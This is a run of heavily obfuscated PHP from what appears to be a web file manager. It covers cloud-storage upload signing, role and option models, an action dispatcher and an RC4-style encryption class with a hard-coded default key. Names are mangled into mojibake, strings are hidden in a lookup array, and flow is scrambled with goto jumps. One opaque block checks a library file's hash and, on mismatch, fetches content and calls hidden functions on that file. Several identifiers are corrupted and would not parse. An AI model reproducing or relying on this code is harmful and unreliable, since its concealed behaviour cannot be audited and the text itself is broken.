infoAuth($Dóï¹Ä™Ğ‰) { return $this->infoParse($Dóï¹Ä™Ğ‰); } public function infoWithChildren($aÎÍñ„íñ•) { return $this->infoParse($aÎÍñ„íñ•); } public function infoFull($cïôê³ˆ) { return $this->infoParse($cïôê³ˆ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($F¾¢çõÜÈ‰) { $this->pathParse = $F¾¢çõÜÈ‰; } protected function infoParse($cå‰òˆ«îŠ) { $aÀàŞ­Àî“ =& $_SERVER[¿õñ]; return Action($aÀàŞ­Àî“[1001])->sharePathInfo($this->pathParse[$aÀàŞ­Àî“[76]], !0); } public function listAll($eÒ†‚À—Æ¨) { $a’äÈÀˆƒ¨ =& $_SERVER[¿õñ]; $D…Ÿö²—‹ = IO::listAll($eÒ†‚À—Æ¨); foreach ($D…Ÿö²—‹ as &$D¸›áÔ‹—‡) { check_abort(); $D¸›áÔ‹—‡ = array_merge(IO::info($D¸›áÔ‹—‡[$a’äÈÀˆƒ¨[76]]), $D¸›áÔ‹—‡); $D¸›áÔ‹—‡[$a’äÈÀˆƒ¨[388]] = Action($a’äÈÀˆƒ¨[1001])->itemInfo($D¸›áÔ‹—‡); $c³ÎóÌ£´Å = substr($D¸›áÔ‹—‡[$a’äÈÀˆƒ¨[76]], strpos(ltrim($D¸›áÔ‹—‡[$a’äÈÀˆƒ¨[76]], $a’äÈÀˆƒ¨[8]), $a’äÈÀˆƒ¨[8]) + 1); $D¸›áÔ‹—‡[$a’äÈÀˆƒ¨[388]][$a’äÈÀˆƒ¨[76]] = $this->pathParse[$a’äÈÀˆƒ¨[996]] . $c³ÎóÌ£´Å; } return $D…Ÿö²—‹; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($DÉ¦§¸ÂŸ‚) { parent::__construct($DÉ¦§¸ÂŸ‚); $this->signatureVersion($_SERVER[¿õñ][197]); } public function uploadFormData($D¼ĞŠ·ÀÎğ, $CÅ‘—ÎãåÃ = 3600) { goto f½ÈËÏ•²Ö; CêŒó±Œ»: $fà‹×Ÿ†‚ğ = $f‚âĞ¥Ù…[59]; $f•£Â×£º = gmdate($f‚âĞ¥Ù…[1103]); $c°·ò¾£·« = gmdate($f‚âĞ¥Ù…[687]); goto DÒˆ‚‚­ÍÔ; cÕ»Ğˆè‰Í: $d„¸Éàâ£ò = hash_hmac($f‚âĞ¥Ù…[1112], $fà‹×Ÿ†‚ğ, $AÙ¾¦¯ÜøÚ, !0); $A¬ìÅÀó­ = hash_hmac($f‚âĞ¥Ù…[1112], $D©£ÒßÛ’‚, $d„¸Éàâ£ò, !0); $a¥’çœà™Ç = hash_hmac($f‚âĞ¥Ù…[1112], $BñÊƒÕî»¿, $A¬ìÅÀó­); goto d»ÄÒªÖØø; d»ÄÒªÖØø: $C…‚¾†´ññ = array($f‚âĞ¥Ù…[196] => $f‚âĞ¥Ù…[33], $f‚âĞ¥Ù…[1114] => $f‚âĞ¥Ù…[33], $f‚âĞ¥Ù…[1076] => $Fèâ½“™², $f‚âĞ¥Ù…[1080] => $b¹‚Áã·µó, $f‚âĞ¥Ù…[1084] => $BñÊƒÕî»¿, $f‚âĞ¥Ù…[1115] => $FÌ¥ï¸…¸£, $f‚âĞ¥Ù…[1116] => $F¡†òíÕ¦, $f‚âĞ¥Ù…[1117] => $f•£Â×£º, $f‚âĞ¥Ù…[1118] => $aÁÒ˜Ì–Ã, $f‚âĞ¥Ù…[1119] => $a¥’çœà™Ç, $f‚âĞ¥Ù…[166] => $this->getHost()); return $C…‚¾†´ññ; goto b‘°Ñº; DÒˆ‚‚­ÍÔ: $D©£ÒßÛ’‚ = $f‚âĞ¥Ù…[1104]; $aÁÒ˜Ì–Ã = $CÅ‘—ÎãåÃ . $f‚âĞ¥Ù…[33]; $b¹‚Áã·µó = $f‚âĞ¥Ù…[1072]; goto cñö¶ğ«ò©; Aõ¼’ÁÚË: $BñÊƒÕî»¿ = base64_encode(json_encode($E¡Ÿã­¦ªß)); $dŒŞäëôÙŠ = hash_hmac($f‚âĞ¥Ù…[1112], $c°·ò¾£·«, $f‚âĞ¥Ù…[1113] . $this->secret, !0); $AÙ¾¦¯ÜøÚ = hash_hmac($f‚âĞ¥Ù…[1112], $this->region, $dŒŞäëôÙŠ, !0); goto cÕ»Ğˆè‰Í; f½ÈËÏ•²Ö: $f‚âĞ¥Ù… =& $_SERVER[¿õñ]; $Fèâ½“™² = $f‚âĞ¥Ù…[182]; $F¡†òíÕ¦ = $f‚âĞ¥Ù…[1102]; goto CêŒó±Œ»; cñö¶ğ«ò©: $cŠÎÖƒ…®Ò = array($this->accessKey, $c°·ò¾£·«, $this->region, $fà‹×Ÿ†‚ğ, $D©£ÒßÛ’‚); $FÌ¥ï¸…¸£ = implode($f‚âĞ¥Ù…[8], $cŠÎÖƒ…®Ò); $E¡Ÿã­¦ªß = array($f‚âĞ¥Ù…[1074] => gmdate($f‚âĞ¥Ù…[1073], strtotime($f‚âĞ¥Ù…[1105])), $f‚âĞ¥Ù…[1075] => array(array($f‚âĞ¥Ù…[1077] => $this->bucket), array($f‚âĞ¥Ù…[1076] => $Fèâ½“™²), array($f‚âĞ¥Ù…[1078], $f‚âĞ¥Ù…[1079], $f‚âĞ¥Ù…[33]), array($f‚âĞ¥Ù…[1078], $f‚âĞ¥Ù…[1106], $f‚âĞ¥Ù…[33]), array($f‚âĞ¥Ù…[1078], $f‚âĞ¥Ù…[1107], $f‚âĞ¥Ù…[33]), array($f‚âĞ¥Ù…[1080] => $b¹‚Áã·µó), array($f‚âĞ¥Ù…[1108] => $FÌ¥ï¸…¸£), array($f‚âĞ¥Ù…[1109] => $F¡†òíÕ¦), array($f‚âĞ¥Ù…[1110] => $f•£Â×£º), array($f‚âĞ¥Ù…[1111] => $aÁÒ˜Ì–Ã))); goto Aõ¼’ÁÚË; b‘°Ñº: } public function fileOutLink($e¨«ÑÌš) { header($_SERVER[¿õñ][153] . $e¨«ÑÌš); die; } } goto cÍ„œÄ³İä; d¢©¢ò…ÚÏ: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } $EãÄŒ«–¬ = LIB_DIR . $_SERVER[¿õñ][778]; $a»˜Ñ¹­‚ = $_SERVER[¿õñ][779]; goto Cì¼¤Ù³¤Õ; B“¡¬Ÿí±§: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\155\137\157\160\x74\151\x6f\x6e"; protected $jsonField = array("\155\x65\156\x75", "\x72\157\x6c\145", "\162\157\x6c\x65\107\162\x6f\165\x70", "\162\x65\147\x69\163\x74", "\x65\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($d±º†„¡ŒÆ) { return "\123\x79\163\164\145\155\x4f\x70\164\x69\x6f\156\137{$d±º†„¡ŒÆ}"; } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\x72\157\x6c\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x61\165\164\x68", "\154\141\142\x65\x6c", "\x64\151\x73\x70\154\141\x79", "\163\x79\x73\164\x65\x6d", "\x64\x65\x73\143", "\151\147\x6e\157\x72\x65\105\170\x74", "\x69\147\x6e\157\x72\x65\x46\x69\154\x65\x53\x69\172\x65", "\x61\144\x6d\x69\x6e\x69\x73\x74\x72\x61\164\x6f\162", "\163\x6f\x72\x74"); public function listData($A«‰ÉĞíÜÀ = false, $C‰Ú‰¼»øƒ = "\x73\157\x72\x74", $døñªÆä˜ø = false) { return parent::listData($A«‰ÉĞíÜÀ, $C‰Ú‰¼»øƒ, $døñªÆä˜ø); } public function update($fµ½ÆÁ”âˆ, $cïá®ÅòĞø) { goto C¥ºó÷ÉŸè; E»Ç˜“îÏË: return parent::update($fµ½ÆÁ”âˆ, $cïá®ÅòĞø); goto eäÖÛÛ¿Âñ; bŸ‹ñ¥Ò‚‰: if (!$dĞŒ•ãœÜ || $EØÁÕŞÛ‚ && $EØÁÕŞÛ‚[$A„Š™ŒŞ¥ö[364]] != $dĞŒ•ãœÜ[$A„Š™ŒŞ¥ö[364]]) { return !1; } if ($EØÁÕŞÛ‚[$A„Š™ŒŞ¥ö[2363]] == 1) { $cïá®ÅòĞø = array($A„Š™ŒŞ¥ö[28] => $cïá®ÅòĞø[$A„Š™ŒŞ¥ö[28]], $A„Š™ŒŞ¥ö[2031] => $cïá®ÅòĞø[$A„Š™ŒŞ¥ö[2031]]); } $this->filterAuth($cïá®ÅòĞø[$A„Š™ŒŞ¥ö[373]]); goto E»Ç˜“îÏË; C¥ºó÷ÉŸè: $A„Š™ŒŞ¥ö =& $_SERVER[¿õñ]; $dĞŒ•ãœÜ = parent::listData($fµ½ÆÁ”âˆ); $EØÁÕŞÛ‚ = $this->findByName($cïá®ÅòĞø[$A„Š™ŒŞ¥ö[28]]); goto bŸ‹ñ¥Ò‚‰; eäÖÛÛ¿Âñ: } public function remove($EƒÕ‰øË…÷) { $D¥ƒˆÙ· = parent::listData($EƒÕ‰øË…÷); if (!$D¥ƒˆÙ· || $D¥ƒˆÙ·[$_SERVER[¿õñ][1059]]) { return !1; } return parent::remove($EƒÕ‰øË…÷); } public function add($aÙ¹“ƒÆ‘) { goto BÕìö®Ú; BåÔµëİÔÛ: $dš°®ÉùïÌ = array($føáäùé•Í[383] => $báÃÏ“¶Ôî, $føáäùé•Í[2019] => $føáäùé•Í[33], $føáäùé•Í[2015] => $føáäùé•Í[2032], $føáäùé•Í[2364] => 1, $føáäùé•Í[2018] => 0, $føáäùé•Í[2365] => 0, $føáäùé•Í[2017] => $this->getSort()); $aÙ¹“ƒÆ‘ = array_merge($dš°®ÉùïÌ, $aÙ¹“ƒÆ‘); $this->filterAuth($aÙ¹“ƒÆ‘[$føáäùé•Í[373]]); goto Cù„ƒ×äÚ—; Cù„ƒ×äÚ—: return parent::insert($aÙ¹“ƒÆ‘); goto aâ‘ÎøŒ­ ; BÕìö®Ú: $føáäùé•Í =& $_SERVER[¿õñ]; $báÃÏ“¶Ôî = $aÙ¹“ƒÆ‘[$føáäùé•Í[28]]; if ($this->findByName($báÃÏ“¶Ôî)) { return !1; } goto BåÔµëİÔÛ; aâ‘ÎøŒ­ : } private function getSort() { $BÖÁ¡ÚÀ§ =& $_SERVER[¿õñ]; $CÁÔÆµÏ½Í = parent::listData(); $B¨·‘¿ÚÉê = array_to_keyvalue($CÁÔÆµÏ½Í, $BÖÁ¡ÚÀ§[33], $BÖÁ¡ÚÀ§[2034]); return empty($B¨·‘¿ÚÉê) ? 0 : max($B¨·‘¿ÚÉê) + 1; } private function filterAuth(&$a…ºµŸ³÷ò) { $DîÎ–­Ÿà‚ =& $_SERVER[¿õñ]; $dŒ£Ô–¼ = array(); $dåÈƒğÖÜ† = array_filter(explode($DîÎ–­Ÿà‚[47], $a…ºµŸ³÷ò)); foreach ($dåÈƒğÖÜ† as $a…ºµŸ³÷ò) { $BÂ÷Í©«ä“ = explode($DîÎ–­Ÿà‚[92], $a…ºµŸ³÷ò); if ($BÂ÷Í©«ä“[0] == $DîÎ–­Ÿà‚[1693] && $BÂ÷Í©«ä“[1] != $DîÎ–­Ÿà‚[1021]) { $a¨¥ŸÏ¹‡ç = $BÂ÷Í©«ä“[0] . $DîÎ–­Ÿà‚[92] . $BÂ÷Í©«ä“[1] . $DîÎ–­Ÿà‚[2366]; if (!in_array($a¨¥ŸÏ¹‡ç, $dåÈƒğÖÜ†)) { $dŒ£Ô–¼[] = $a¨¥ŸÏ¹‡ç; } } $dŒ£Ô–¼[] = $a…ºµŸ³÷ò; } $a…ºµŸ³÷ò = implode($DîÎ–­Ÿà‚[47], $dŒ£Ô–¼); } public function sort($D¬èñŞæœÉ, $C¶ˆß¾â¤Û) { return parent::update($D¬èñŞæœÉ, $C¶ˆß¾â¤Û); } } goto A‚Ç¿ìÍø›; a‘‰ê‘ÚóÊ: function Action($Eõ„šÃ´ùâ = '') { goto f‰ÃŠñÉ‡Ä; aÂÆœïÏæ: $e°ÛÉæùÚ = strtolower($dèÃ„Ô’…); if (isset($E’µÕÕ³Í[$e°ÛÉæùÚ])) { return $E’µÕÕ³Í[$e°ÛÉæùÚ]; } if (is_file($B‡­«ÕİÉŞ)) { include_once $B‡­«ÕİÉŞ; } goto C¸½Œ»Şâ; C¸½Œ»Şâ: if (!class_exists($dèÃ„Ô’…)) { return actionCallError("\x5b{$Eõ„šÃ´ùâ}\40\75\76\40{$dèÃ„Ô’…}\135\40\x63\154\141\163\x73\40\x6e\x6f\164\40\x65\x78\x69\x73\x74\x73\x21"); } $E’µÕÕ³Í[$e°ÛÉæùÚ] = new $dèÃ„Ô’…(); return $E’µÕÕ³Í[$e°ÛÉæùÚ]; goto dêØø£÷; f‰ÃŠñÉ‡Ä: $fñÎ‰’…øÂ =& $_SERVER[ĞÌÅˆ•ÉíŒÆÆ]; static $E’µÕÕ³Í = array(); $Eõ„šÃ´ùâ = trim(str_replace($fñÎ‰’…øÂ[4], $fñÎ‰’…øÂ[5], $Eõ„šÃ´ùâ), $fñÎ‰’…øÂ[4]); goto f–²Öæœ¯…; f–²Öæœ¯…: $Aê×ÑŞ—²ä = explode($fñÎ‰’…øÂ[5], $Eõ„šÃ´ùâ); $BŞŠÈ•å‘ = strtolower($Aê×ÑŞ—²ä[0]); if (substr($BŞŠÈ•å‘, -6) == $fñÎ‰’…øÂ[6]) { $Eõ„šÃ´ùâ = substr($Aê×ÑŞ—²ä[0], 0, -6); $dèÃ„Ô’… = $Eõ„šÃ´ùâ . $fñÎ‰’…øÂ[7]; $B‡­«ÕİÉŞ = $fñÎ‰’…øÂ[8]; if (isset($Aê×ÑŞ—²ä[1]) && substr(strtolower($Aê×ÑŞ—²ä[1]), -5) == $fñÎ‰’…øÂ[9]) { $dèÃ„Ô’… = $Eõ„šÃ´ùâ . $Aê×ÑŞ—²ä[1]; $B‡­«ÕİÉŞ = $fñÎ‰’…øÂ[10] . $Aê×ÑŞ—²ä[1] . $fñÎ‰’…øÂ[11]; } else { if (count($Aê×ÑŞ—²ä) == 3) { $dèÃ„Ô’… = $Eõ„šÃ´ùâ . $Aê×ÑŞ—²ä[1] . $Aê×ÑŞ—²ä[2]; $B‡­«ÕİÉŞ = $fñÎ‰’…øÂ[12] . $Aê×ÑŞ—²ä[1] . $fñÎ‰’…øÂ[13] . $Aê×ÑŞ—²ä[2] . $fñÎ‰’…øÂ[11]; } } $B‡­«ÕİÉŞ = PLUGIN_DIR . $Eõ„šÃ´ùâ . $fñÎ‰’…øÂ[4] . $B‡­«ÕİÉŞ; } else { if (substr($BŞŠÈ•å‘, -5) == $fñÎ‰’…øÂ[9]) { $Eõ„šÃ´ùâ = substr($Aê×ÑŞ—²ä[0], 0, -5); return Model($Eõ„šÃ´ùâ); } else { $dèÃ„Ô’… = $Aê×ÑŞ—²ä[0] . $Aê×ÑŞ—²ä[1]; $B‡­«ÕİÉŞ = CONTROLLER_DIR . $Aê×ÑŞ—²ä[0] . $fñÎ‰’…øÂ[4] . $Aê×ÑŞ—²ä[1] . $fñÎ‰’…øÂ[14]; } } goto aÂÆœïÏæ; dêØø£÷: } function ActionApply($F‹Íƒ…âøƒ, $cœ¸ÄÄØ¥ = array()) { goto C•´ë¸±§½; C•´ë¸±§½: if (is_array($F‹Íƒ…âøƒ)) { return call_user_func_array($F‹Íƒ…âøƒ, $cœ¸ÄÄØ¥); } if (function_exists($F‹Íƒ…âøƒ)) { return call_user_func_array($F‹Íƒ…âøƒ, $cœ¸ÄÄØ¥); } $B’ù’„ƒã = strrpos($F‹Íƒ…âøƒ, $_SERVER[ĞÌÅˆ•ÉíŒÆÆ][5]); goto E‹è§È£À; E‹è§È£À: $cà‹í…Æ = substr($F‹Íƒ…âøƒ, 0, $B’ù’„ƒã); $CÙ²§Ìêå = substr($F‹Íƒ…âøƒ, $B’ù’„ƒã + 1); $DâİŞç‡Áù = Action($cà‹í…Æ); goto Fò³ò¼¥óÂ; Fò³ò¼¥óÂ: if (!method_exists($DâİŞç‡Áù, $CÙ²§Ìêå)) { return actionCallError("{$F‹Íƒ…âøƒ}\x20\155\145\164\150\x6f\x64\40\156\x6f\x74\x20\x65\170\151\163\164\163\x21"); } $A‹ÒÛ°îô” = call_user_func_array(array($DâİŞç‡Áù, $CÙ²§Ìêå), $cœ¸ÄÄØ¥); return $A‹ÒÛ°îô”; goto E…ÏÀù¬°¡; E…ÏÀù¬°¡: } function actionCallError($eÖ¢İ®‰‰˜) { $FöÒ»¥èåÁ =& $_SERVER[ĞÌÅˆ•ÉíŒÆÆ]; $B‚Êò¶¼» = json_encode_force(array($FöÒ»¥èåÁ[15] => this_url(), $FöÒ»¥èåÁ[16] => $GLOBALS[$FöÒ»¥èåÁ[16]])); $B‚Êò¶¼» = str_replace(array($FöÒ»¥èåÁ[17]), array($FöÒ»¥èåÁ[4]), $B‚Êò¶¼»); return write_log($eÖ¢İ®‰‰˜ . $FöÒ»¥èåÁ[18] . $B‚Êò¶¼», $FöÒ»¥èåÁ[19]); } goto D‚£ù‘½™; bŒ›ÁË÷’’: class Mcrypt { public static $defaultKey = "\x61\x21\164\141\153\101\72\144\154\x6d\x63\x6c\x64\105\166\54\145"; public static function encode($D÷ĞãÆ„Šù, $FÖÒæŠŸÉ = '', $B©á£×õ = 0, $fã×éÔÖ‰£ = '') { goto fî÷¢ö‘×œ; fî÷¢ö‘×œ: $D÷ÅëõÍË¡ =& $_SERVER[¿õñ]; $aÉœë¹Â£“ = 4; $FÖÒæŠŸÉ = md5($FÖÒæŠŸÉ ? $FÖÒæŠŸÉ : self::$defaultKey); goto cÜ©—ãøšæ; cÜ©—ãøšæ: $FçÃ¢´İ = md5(substr($FÖÒæŠŸÉ, 0, 16)); $B£¿£©Ïø¦ = md5(substr($FÖÒæŠŸÉ, 16, 16)); $fã×éÔÖ‰£ = $fã×éÔÖ‰£ ? $fã×éÔÖ‰£ : md5(microtime()); goto b³·«ê½; B†ÍŠàÛÃê: $D…ÀÒ—ÆİÅ = str_replace(array($D÷ÅëõÍË¡[281], $D÷ÅëõÍË¡[8], $D÷ÅëõÍË¡[914]), array($D÷ÅëõÍË¡[408], $D÷ÅëõÍË¡[71], $D÷ÅëõÍË¡[92]), $D…ÀÒ—ÆİÅ); return $D…ÀÒ—ÆİÅ; goto BØò†š„Ö; céÌ §ô Æ: $D÷ĞãÆ„Šù = sprintf($D÷ÅëõÍË¡[1841], $B©á£×õ ? $B©á£×õ + time() : 0) . substr(md5($D÷ĞãÆ„Šù . $B£¿£©Ïø¦), 0, 16) . $D÷ĞãÆ„Šù; $C…†™²–â¬ = strlen($D÷ĞãÆ„Šù); $b“ÉœÛ¦æ¯ = array(); goto f Õ¤éš°Õ; f Õ¤éš°Õ: for ($c±ß–Ò»‚ = 0; $c±ß–Ò»‚ <= 255; $c±ß–Ò»‚++) { $b“ÉœÛ¦æ¯[$c±ß–Ò»‚] = ord($e—à›â–ä[$c±ß–Ò»‚ % $D…Ì¨¯ñö†]); } $cƒÔ‘Ş”æ = range(0, 255); for ($aæÛ÷Š–Ù = $c±ß–Ò»‚ = 0; $c±ß–Ò»‚ < 256; $c±ß–Ò»‚++) { $aæÛ÷Š–Ù = ($aæÛ÷Š–Ù + $cƒÔ‘Ş”æ[$c±ß–Ò»‚] + $b“ÉœÛ¦æ¯[$c±ß–Ò»‚]) % 256; $c‹ºàåÊ…– = $cƒÔ‘Ş”æ[$c±ß–Ò»‚]; $cƒÔ‘Ş”æ[$c±ß–Ò»‚] = $cƒÔ‘Ş”æ[$aæÛ÷Š–Ù]; $cƒÔ‘Ş”æ[$aæÛ÷Š–Ù] = $c‹ºàåÊ…–; } goto A„¶óÉ¥ØÍ; A„¶óÉ¥ØÍ: $D…ÀÒ—ÆİÅ = $D÷ÅëõÍË¡[33]; for ($bÙÏö›Ú ­ = $aæÛ÷Š–Ù = $c±ß–Ò»‚ = 0; $c±ß–Ò»‚ < $C…†™²–â¬; $c±ß–Ò»‚++) { $bÙÏö›Ú ­ = ($bÙÏö›Ú ­ + 1) % 256; $aæÛ÷Š–Ù = ($aæÛ÷Š–Ù + $cƒÔ‘Ş”æ[$bÙÏö›Ú ­]) % 256; $c‹ºàåÊ…– = $cƒÔ‘Ş”æ[$bÙÏö›Ú ­]; $cƒÔ‘Ş”æ[$bÙÏö›Ú ­] = $cƒÔ‘Ş”æ[$aæÛ÷Š–Ù]; $cƒÔ‘Ş”æ[$aæÛ÷Š–Ù] = $c‹ºàåÊ…–; $D…ÀÒ—ÆİÅ .= chr(ord($D÷ĞãÆ„Šù[$c±ß–Ò»‚]) ^ $cƒÔ‘Ş”æ[($cƒÔ‘Ş”æ[$bÙÏö›Ú ­] + $cƒÔ‘Ş”æ[$aæÛ÷Š–Ù]) % 256]); } $D…ÀÒ—ÆİÅ = $BÛ«èÇÊö† . str_replace($D÷ÅëõÍË¡[914], $D÷ÅëõÍË¡[33], base64_encode($D…ÀÒ—ÆİÅ)); goto B†ÍŠàÛÃê; b³·«ê½: $BÛ«èÇÊö† = substr($fã×éÔÖ‰£, -$aÉœë¹Â£“); $e—à›â–ä = $FçÃ¢´İ . md5($FçÃ¢´İ . $BÛ«èÇÊö†); $D…Ì¨¯ñö† = strlen($e—à›â–ä); goto céÌ §ô Æ; BØò†š„Ö: } public static function decode($Eéô±äÓË×, $b¹™ÍÌÊˆï = '') { goto B³Ş¿’ƒ¸ ; b¢Ú£ï¿Ç²: $Eéô±äÓË× = base64_decode(substr($Eéô±äÓË×, $C¢ñŠœôÅ)); $a¥æ¸áØºò = strlen($Eéô±äÓË×); $Aë‘ŠäÄ‘’ = array(); goto Bø…î˜¢Êº; Bø…î˜¢Êº: for ($FİŒÆ™Ô • = 0; $FİŒÆ™Ô • <= 255; $FİŒÆ™Ô •++) { $Aë‘ŠäÄ‘’[$FİŒÆ™Ô •] = ord($E„ëßŒ‡•[$FİŒÆ™Ô • % $dßÙä†Âøœ]); } $b×êÏÖ‡ƒ‚ = range(0, 255); for ($BôèÅ—îíÖ = $FİŒÆ™Ô • = 0; $FİŒÆ™Ô • < 256; $FİŒÆ™Ô •++) { $BôèÅ—îíÖ = ($BôèÅ—îíÖ + $b×êÏÖ‡ƒ‚[$FİŒÆ™Ô •] + $Aë‘ŠäÄ‘’[$FİŒÆ™Ô •]) % 256; $CÖ‘˜õöøó = $b×êÏÖ‡ƒ‚[$FİŒÆ™Ô •]; $b×êÏÖ‡ƒ‚[$FİŒÆ™Ô •] = $b×êÏÖ‡ƒ‚[$BôèÅ—îíÖ]; $b×êÏÖ‡ƒ‚[$BôèÅ—îíÖ] = $CÖ‘˜õöøó; } goto c¸Ô·ÕÏ´ó; B³Ş¿’ƒ¸ : $cìÉ·§Â =& $_SERVER[¿õñ]; $Eéô±äÓË× = str_replace(array($cìÉ·§Â[408], $cìÉ·§Â[71], $cìÉ·§Â[92]), array($cìÉ·§Â[281], $cìÉ·§Â[8], $cìÉ·§Â[914]), $Eéô±äÓË×); $C¢ñŠœôÅ = 4; goto fË‘«Òá™Ô; fË‘«Òá™Ô: $b¹™ÍÌÊˆï = md5($b¹™ÍÌÊˆï ? $b¹™ÍÌÊˆï : self::$defaultKey); $bÌä÷§È†µ = md5(substr($b¹™ÍÌÊˆï, 0, 16)); $A½Ë¦½•ê = md5(substr($b¹™ÍÌÊˆï, 16, 16)); goto d¹Ş«²ÅÖ; c¸Ô·ÕÏ´ó: $A¸ÕÙ ÃƒÂ = $cìÉ·§Â[33]; for ($aè‚ËÃ ¯î = $BôèÅ—îíÖ = $FİŒÆ™Ô • = 0; $FİŒÆ™Ô • < $a¥æ¸áØºò; $FİŒÆ™Ô •++) { $aè‚ËÃ ¯î = ($aè‚ËÃ ¯î + 1) % 256; $BôèÅ—îíÖ = ($BôèÅ—îíÖ + $b×êÏÖ‡ƒ‚[$aè‚ËÃ ¯î]) % 256; $CÖ‘˜õöøó = $b×êÏÖ‡ƒ‚[$aè‚ËÃ ¯î]; $b×êÏÖ‡ƒ‚[$aè‚ËÃ ¯î] = $b×êÏÖ‡ƒ‚[$BôèÅ—îíÖ]; $b×êÏÖ‡ƒ‚[$BôèÅ—îíÖ] = $CÖ‘˜õöøó; $A¸ÕÙ ÃƒÂ .= chr(ord($Eéô±äÓË×[$FİŒÆ™Ô •]) ^ $b×êÏÖ‡ƒ‚[($b×êÏÖ‡ƒ‚[$aè‚ËÃ ¯î] + $b×êÏÖ‡ƒ‚[$BôèÅ—îíÖ]) % 256]); } if ((substr($A¸ÕÙ ÃƒÂ, 0, 10) == 0 || substr($A¸ÕÙ ÃƒÂ, 0, 10) - time() > 0) && substr($A¸ÕÙ ÃƒÂ, 10, 16) == substr(md5(substr($A¸ÕÙ ÃƒÂ, 26) . $A½Ë¦½•ê), 0, 16)) { return substr($A¸ÕÙ ÃƒÂ, 26); } else { return $cìÉ·§Â[33]; } goto fæ‹˜œàªÜ; d¹Ş«²ÅÖ: $E³ºÍ’¡è” = substr($Eéô±äÓË×, 0, $C¢ñŠœôÅ); $E„ëßŒ‡• = $bÌä÷§È†µ . md5($bÌä÷§È†µ . $E³ºÍ’¡è”); $dßÙä†Âøœ = strlen($E„ëßŒ‡•); goto b¢Ú£ï¿Ç²; fæ‹˜œàªÜ: } } define($_SERVER[¿õñ][1842], 1); define($_SERVER[¿õñ][1843], 2); goto eøñå†¬Ï; fŠ•àóÊÖ§: $a»˜Ñ¹­‚ = $_SERVER[¿õñ][779]; if ($_SERVER[$_SERVER[¿õñ][780]] != $a»˜Ñ¹­‚($EãÄŒ«–¬)) { goto aÛ‹˜¦ä¸×; dØ³³öêƒÇ: $B¹‚Ç «·« = explode($_SERVER[¿õñ][214], $d´§‡¹ï·È); if (count($B¹‚Ç «·«) < $_SERVER[¿õñ][550]) { $aàİ ‡¡áˆ = $_SERVER[¿õñ][784]; $aàİ ‡¡áˆ(); } $Cæ“ôÓ’‘ = $_SERVER[¿õñ][785]; goto Cäğåª¶›; aÛ‹˜¦ä¸×: $c¾õ¿„¯¢© = $_SERVER[¿õñ][781]; $FÚÓ‡îŒ = $_SERVER[$_SERVER[¿õñ][782]] . $_SERVER[¿õñ][783]; $d´§‡¹ï·È = $c¾õ¿„¯¢©($FÚÓ‡îŒ); goto dØ³³öêƒÇ; Cäğåª¶›: $Cæ“ôÓ’‘($EãÄŒ«–¬); goto aø·Œ»¾õ‹; aø·Œ»¾õ‹: } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($BÎò§ÚòˆÀ) { parent::__construct($BÎò§ÚòˆÀ); } public function uploadFormData($c ˜ùäÕğ›, $e–Ø÷«¿â = 3600) { goto AÙ†§’—³; b°Öå÷ÚË: $FÏ˜§·Şô = array($C¤ÇºŠˆÎí[196] => $C¤ÇºŠˆÎí[33], $C¤ÇºŠˆÎí[1114] => $C¤ÇºŠˆÎí[33], $C¤ÇºŠˆÎí[1076] => $fìÏ„ä¸¯¯, $C¤ÇºŠˆÎí[1080] => $eï—‡Š¢Ñ÷, $C¤ÇºŠˆÎí[1084] => $B• ‚ª¼º, $C¤ÇºŠˆÎí[1115] => $Föã”“Œ‹¸, $C¤ÇºŠˆÎí[1116] => $f‹­Ç‰¸ÑŠ, $C¤ÇºŠˆÎí[1117] => $bŒ„‘‘¯ï°, $C¤ÇºŠˆÎí[1118] => $c‚…Ò‰ÎÂ˜, $C¤ÇºŠˆÎí[1119] => $DğÏéöùÖ, $C¤ÇºŠˆÎí[166] => $this->getHost()); return $FÏ˜§·Şô; goto b¸£ŠŒ¯ÍÔ; aÑ‚ÀˆåŞ: $d»Ä¬å„ = $C¤ÇºŠˆÎí[1104]; $c‚…Ò‰ÎÂ˜ = $e–Ø÷«¿â . $C¤ÇºŠˆÎí[33]; $eï—‡Š¢Ñ÷ = $C¤ÇºŠˆÎí[1072]; goto a¤š„È¯‡; aÉ¾ö§ñæº: $B• ‚ª¼º = base64_encode(json_encode($aïÌÏ¡…¹©)); $d›ğÈéÓ‡µ = hash_hmac($C¤ÇºŠˆÎí[1112], $EöÆš’Ç‡, $C¤ÇºŠˆÎí[1113] . $this->secret, !0); $BùóÃ¬¡ˆ² = hash_hmac($C¤ÇºŠˆÎí[1112], $this->region, $d›ğÈéÓ‡µ, !0); goto DõèÓï›âÎ; a¤š„È¯‡: $AóÁ†Ô‡ªô = array($this->accessKey, $EöÆš’Ç‡, $this->region, $eÂ†àÆëãõ, $d»Ä¬å„); $Föã”“Œ‹¸ = implode($C¤ÇºŠˆÎí[8], $AóÁ†Ô‡ªô); $aïÌÏ¡…¹© = array($C¤ÇºŠˆÎí[1074] => gmdate($C¤ÇºŠˆÎí[1073], strtotime($C¤ÇºŠˆÎí[1105])), $C¤ÇºŠˆÎí[1075] => array(array($C¤ÇºŠˆÎí[1077] => $this->bucket), array($C¤ÇºŠˆÎí[1076] => $fìÏ„ä¸¯¯), array($C¤ÇºŠˆÎí[1078], $C¤ÇºŠˆÎí[1079], $C¤ÇºŠˆÎí[33]), array($C¤ÇºŠˆÎí[1078], $C¤ÇºŠˆÎí[1106], $C¤ÇºŠˆÎí[33]), array($C¤ÇºŠˆÎí[1078], $C¤ÇºŠˆÎí[1107], $C¤ÇºŠˆÎí[33]), array($C¤ÇºŠˆÎí[1080] => $eï—‡Š¢Ñ÷), array($C¤ÇºŠˆÎí[1108] => $Föã”“Œ‹¸), array($C¤ÇºŠˆÎí[1109] => $f‹­Ç‰¸ÑŠ), array($C¤ÇºŠˆÎí[1110] => $bŒ„‘‘¯ï°), array($C¤ÇºŠˆÎí[1111] => $c‚…Ò‰ÎÂ˜))); goto aÉ¾ö§ñæº; FÎ‚«‡œ­: $eÂ†àÆëãõ = $C¤ÇºŠˆÎí[59]; 